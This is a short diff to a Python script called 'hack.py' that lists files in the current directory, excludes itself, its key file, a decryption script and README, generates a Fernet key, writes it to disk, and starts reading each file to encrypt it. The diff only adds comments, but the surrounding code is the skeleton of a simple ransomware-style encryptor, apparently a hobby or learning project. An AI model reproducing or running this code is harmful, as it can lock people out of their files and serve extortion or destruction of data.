@@ -5,6 +5,7 @@ from cryptography.fernet import Fernet
 
 files=[]
 
+#save files in "files"-array
 for file in os.listdir():
 	if file =="hack.py" or file=="thekey.key"or file== "decrypted.py" or file=="README.md":
 		continue
@@ -13,12 +14,13 @@ for file in os.listdir():
 
 print(files)
 
-
+#generate key and save it in "thekey.key"
 key=Fernet.generate_key()
 
 with open("thekey.key","wb") as thekey:
 	thekey.write(key)
 
+#encrypt files
 for file in files:
 	with open(file,"rb") as thefile:
 		contents= thefile.read()
